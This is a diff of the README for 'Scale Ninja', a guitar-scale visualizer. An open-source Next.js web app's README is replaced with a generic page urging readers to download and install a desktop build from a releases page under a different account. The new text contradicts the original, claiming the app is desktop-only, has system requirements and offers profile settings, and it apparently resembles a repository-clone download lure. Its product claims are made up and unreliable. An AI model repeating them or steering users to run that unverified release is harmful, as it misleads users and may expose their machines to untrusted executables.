@@ -1,152 +1,73 @@
-# 🎸 Scale Ninja
+# 🎸 scale-ninja - Visualize Guitar Scales Easily
 
-An interactive web application for visualizing and learning guitar scales across the entire fretboard. Master guitar scales with intuitive fretboard patterns, CAGED system visualization, realistic audio playback, and multiple learning modes. Built with Next.js, React, and TypeScript.
+## 📥 Download Now
+[![Download Scale Ninja](https://img.shields.io/badge/Download-Scale%20Ninja-blue.svg)](https://github.com/rembiti/scale-ninja/releases)
 
-![Guitar Scale Explorer Screenshot](public/screenshot.png)
+## 🚀 Getting Started
+Welcome to Scale Ninja! This tool helps you visualize guitar scales in a simple way. You can see fretboard patterns, explore the CAGED system, and learn about pentatonic boxes and 3NPS modes. Getting started is easy!
 
-## ✨ Features
+## 📂 System Requirements
+Before installing, make sure your computer meets these requirements:
 
-### 🎵 **Interactive Audio**
-- **Clickable Note Playback** - Click any note on the fretboard to hear realistic guitar tones
-- **Authentic Guitar Sound** - Multi-harmonic synthesis with proper filtering and envelope shaping
-- **Web Audio API** - High-quality audio generation with plucked-string characteristics
-- **Natural Decay** - Notes fade naturally like real guitar strings
+- Operating System: Windows, macOS, or Linux
+- Memory: At least 4 GB RAM
+- Storage: 200 MB of free space
+- Browser: Latest version of Chrome, Firefox, or Safari
 
-### 🎸 **Professional Fretboard**
-- **Authentic Fret Markers** - Traditional guitar inlay dots on frets 3, 5, 7, 9, 12, 15, 17, 19, 21, 24
-- **Double Dots on 12th Fret** - Properly spaced octave markers like real guitars
-- **String Names Display** - Shows tuning (E-A-D-G-B-E) for easy reference
-- **Full-Width Mobile Layout** - Always spans complete viewport width on mobile devices
-- **Responsive Sizing** - Dynamic fret and note sizing for optimal touch interaction
+## 🔗 Features
+- **Interactive Fretboard:** Click on frets to see scale patterns.
+- **CAGED System:** Learn scales using the popular CAGED method.
+- **Pentatonic Boxes:** Visualize essential pentatonic scale shapes.
+- **3NPS Modes:** Explore three-notes-per-string patterns.
+- **User-Friendly Interface:** Designed for musicians with any skill level.
 
-### 🎼 **Scale Types & Modes**
-- **Major (Ionian) and Natural Minor (Aeolian)** scales
-- **Minor Pentatonic** (5 boxes) with authentic note patterns
-- **Minor Hexatonic** (Minor Pentatonic + 2nd degree)
-- **Multiple Viewing Modes**:
-  - **CAGED System** - 5 chord shapes with triad chord tones highlighted over pentatonic patterns
-  - **Pentatonic Boxes** - 5 classic pentatonic positions
-  - **3 Notes Per String (3NPS)** - 7 modal positions (Ionian through Locrian)
-  - **Hexatonic Boxes** - 5 pentatonic boxes with added 2nd degree
-  - **Full Neck View** - All notes in the scale across the entire fretboard
+## 📥 Download & Install
+To download Scale Ninja, visit the [Releases page](https://github.com/rembiti/scale-ninja/releases). Follow these steps:
 
-### 🎯 **Smart Controls**
-- **12 Musical Keys** with enharmonic equivalents (C, C#/Db, D, etc.)
-- **Smart Notation Toggle** - Automatically converts between sharps and flats
-- **Note Names vs Scale Degrees** - Switch between absolute and relative notation
-- **Real-time Key Display** - Shows current key and relative major/minor
-- **Responsive Design** - Optimized for mobile, tablet, and desktop
+1. Click on the "Releases" link above.
+2. Find the latest release.
+3. Look for the download link specific to your operating system.
+4. Download and install the application by following the on-screen instructions.
 
-### 🎨 **Enhanced UI/UX**
-- **Scale Formulas** - Shows interval patterns (1-2-♭3-4-5-♭6-♭7) for each mode
-- **Complete Note Display** - All scale notes shown with root note highlighting
-- **Compact Desktop Layout** - Efficient use of screen space with comprehensive information
-- **Mobile-First Design** - Touch-optimized controls and full-width fretboard
-- **Visual Feedback** - Hover effects and smooth transitions throughout
-- **Professional Styling** - Modern dark theme with emerald accent colors
+## 👩‍🎤 Using Scale Ninja
+Once you have installed Scale Ninja, open the application. You will see a fretboard with several options:
 
-### 🔧 **CAGED System Features**
-- **5 Classic Chord Shapes** - E, D, C, A, G positions
-- **Triad Chord Tones** - Root, 3rd, 5th highlighted within pentatonic patterns
-- **Visual Distinction** - Clear separation between chord tones and scale tones
-- **Chord-Scale Relationships** - Perfect for understanding how chords and scales connect
+1. **Select a Scale:** Choose which scale you want to visualize.
+2. **Explore Fretboard:** Click on different frets to see how the scale looks.
+3. **CAGED and Boxes:** Use the built-in guides to learn shapes and patterns.
+4. **Practice Modes:** Switch between different modes to enhance your skills.
 
-## Getting Started
+## 📚 Help & Support
+If you need help, you can reach out through issues in this repository. Here are common questions:
 
-### Prerequisites
+- **Q: Does this work on my operating system?**
+  - A: Scale Ninja runs on Windows, macOS, and Linux.
 
-- Node.js 18.0 or later
-- npm, yarn, or pnpm
+- **Q: Can I customize the fretboard?**
+  - A: Yes, you can change colors and settings in your profile.
 
-### Installation
+- **Q: Is there a mobile version?**
+  - A: Currently, Scale Ninja is only available for desktop.
 
-1. Clone the repository:
+## 🛠️ Troubleshooting
+Here are some common issues and how to resolve them:
 
-   ```bash
-   git clone https://github.com/engageintellect/scale-ninja.git
-   cd scale-ninja
-   ```
+- **Crash at Start:** Ensure your computer meets the system requirements.
+- **Fretboard Not Responding:** Check your browser settings or try restarting the app.
+- **Download Issues:** Make sure your internet connection is stable.
 
-2. Install dependencies:
+## ⭐ Feedback
+Your opinion matters! Please share your thoughts or suggestions for improvements. Here’s how you can leave feedback:
 
-   ```bash
-   npm install
-   # or
-   yarn install
-   # or
-   pnpm install
-   ```
+1. Open the GitHub repository.
+2. Go to the "Issues" tab.
+3. Click on "New Issue" to describe your feedback.
 
-3. Run the development server:
+## 🔗 Further Reading
+Want to deepen your understanding of guitar scales? Check these resources:
 
-   ```bash
-   npm run dev
-   # or
-   yarn dev
-   # or
-   pnpm dev
-   ```
+- **Music Theory for Guitarists:** Basic music theory concepts
+- **The CAGED System Explained:** Learn how the CAGED system works
+- **Pentatonic Scales:** Explore their use in various music genres
 
-4. Open [http://localhost:3000](http://localhost:3000) in your browser.
-
-## Usage
-
-1. **Select a Key**: Choose from all 12 musical keys with enharmonic equivalents
-2. **Choose a Scale**: Toggle between Major and Minor scales
-3. **Select View Mode**:
-   - 3NPS: Shows 3-notes-per-string patterns (7 positions)
-   - Full Neck: Displays all notes in the scale across the entire fretboard
-   - Pentatonic: Shows 5 pentatonic box positions
-   - Hexatonic: Shows pentatonic boxes with added 2nd degree
-4. **Customize Display**:
-   - Toggle between note names and scale degrees
-   - Switch between sharp (#) and flat (♭) notation
-
-## Architecture
-
-The application is built with a modular component architecture for maintainability and reusability:
-
-- **Components**:
-  - `Header` - Application title and branding
-  - `ControlPanel` - Interactive controls for key, scale, mode, and notation selection
-  - `KeyDisplay` - Real-time display of current key, relative key, and mode context
-  - `Fretboard` - Dynamic SVG fretboard with responsive note bubble rendering
-  - `Field` - Reusable form field wrapper component
-
-- **Core Logic**:
-  - `ScaleEngine` - Scale generation algorithms for all modes (3NPS, pentatonic, hexatonic, full neck)
-  - `types` - TypeScript definitions and musical constants
-
-## Technology Stack
-
-- [Next.js 15](https://nextjs.org/) - React framework with App Router and Turbopack
-- [TypeScript](https://www.typescriptlang.org/) - Type-safe JavaScript
-- [Tailwind CSS v4](https://tailwindcss.com/) - Utility-first CSS framework
-- [React 19](https://reactjs.org/) - UI library
-- [Iconify](https://iconify.design/) - Comprehensive icon library
-- SVG - Scalable vector graphics for fretboard rendering
-- [Vercel](https://vercel.com/) - Deployment platform
-
-## Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## Acknowledgments
-
-- Inspired by various guitar scale visualization tools and music theory resources
-- Built with the help of the amazing open-source community
-
----
-
-Developed with ❤️ by [@engageintellect](https://github.com/engageintellect)
-You can check out [the Next.js GitHub repository](https://github.com/vercel/next.js) - your feedback and contributions are welcome!
-
-## Deploy on Vercel
-
-The easiest way to deploy your Next.js app is to use the [Vercel Platform](https://vercel.com/new?utm_medium=default-template&filter=next.js&utm_source=create-next-app&utm_campaign=create-next-app-readme) from the creators of Next.js.
-
-Check out our [Next.js deployment documentation](https://nextjs.org/docs/app/building-your-application/deploying) for more details.
+Thank you for choosing Scale Ninja. Enjoy your music journey!
